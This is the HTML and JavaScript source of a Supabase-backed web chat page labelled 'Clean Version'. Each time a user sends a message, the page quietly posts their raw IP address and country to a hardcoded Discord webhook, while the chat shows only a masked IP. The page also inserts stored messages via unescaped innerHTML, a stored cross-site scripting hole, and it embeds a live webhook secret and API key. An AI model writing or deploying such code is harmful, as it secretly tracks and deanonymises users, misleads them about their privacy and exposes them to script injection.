<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Nulls SD Chat â€” Clean Version</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
    body {
        background: #0a0013;
        color: #e6d6ff;
        font-family: monospace;
        margin: 0;
        display: flex;
        flex-direction: column;
        height: 100vh;
    }
    #online {
        padding: 10px;
        background: #140025;
        border-bottom: 2px solid #b24dff;
    }
    #chat {
        flex: 1;
        overflow-y: auto;
        padding: 15px;
    }
    #input {
        display: flex;
        padding: 10px;
        background: #140025;
        border-top: 2px solid #b24dff;
    }
    input {
        flex: 1;
        padding: 8px;
        background: #1b0030;
        border: 1px solid #b24dff;
        color: #e6d6ff;
        border-radius: 5px;
    }
    button {
        margin-left: 8px;
        background: #b24dff;
        border: none;
        padding: 8px 15px;
        border-radius: 5px;
        color: white;
        cursor: pointer;
    }
</style>
</head>
<body>
<div id="online">Online: Loading...</div>
<div id="chat"></div>
<div id="input">
    <input id="msg" placeholder="Type..." />
    <button onclick="sendMessage()">Send</button>
</div>
<script>
const sb = supabase.createClient(
    "https://ajpjmocfhcekpkoufkan.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFqcGptb2NmaGNla3Brb3Vma2FuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMyMTk1ODUsImV4cCI6MjA3ODc5NTU4NX0.DOkNHEaNKH78yVpFDLbo-eHAfy1W8fZNLbaOsxNEOA8"
);

async function getGeo() {
    try {
        const r = await fetch("https://ipapi.co/json/");
        return await r.json();
    } catch {
        return { ip: "0.0.0.0", country_name: "Unknown" };
    }
}

function maskIP(ip) {
    const p = ip.split(".");
    return `${p[0]}.${p[1]}.${p[2]}.*`;
}

async function loadMessages() {
    const { data } = await sb.from("messages").select("content, created_at").order("created_at", { ascending: true });
    const chat = document.getElementById("chat");
    chat.innerHTML = "";
    data.forEach(m => {
        const div = document.createElement("div");
        div.innerHTML = `${m.content}`;
        chat.appendChild(div);
    });
    chat.scrollTop = chat.scrollHeight;
}

async function updateOnline() {
    const { data } = await sb.from("messages").select("content, created_at").gte(
        "created_at",
        new Date(Date.now() - 5*60*1000).toISOString()
    );
    document.getElementById("online").textContent = `Online: ${data.length}`;
}

sb.channel('public:messages')
.on('postgres_changes', { event: '*', schema: 'public', table: 'messages' }, () => {
    loadMessages();
    updateOnline();
})
.subscribe();

loadMessages();
updateOnline();
setInterval(updateOnline, 5000);

async function sendMessage() {
    const msg = document.getElementById("msg").value;
    if (!msg.trim()) return;

    const geo = await getGeo();

    // SEND RAW IP TO DISCORD WEBHOOK
    fetch("https://discord.com/api/webhooks/1439727290471944374/ZEDBQFgOee4hIQ1lgvsQUBD5cctX4Vmu_G_J8eDxnBNm4Yae6AatCmNm_xaaziMBrDVS", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `IP: ${geo.ip} | Country: ${geo.country_name}` })
    });

    const masked = maskIP(geo.ip);

    await sb.from("messages").insert([
        {
            content: `${masked}: ${msg}`
        }
    ]);

    document.getElementById("msg").value = "";
}
</script>
</body>
</html>
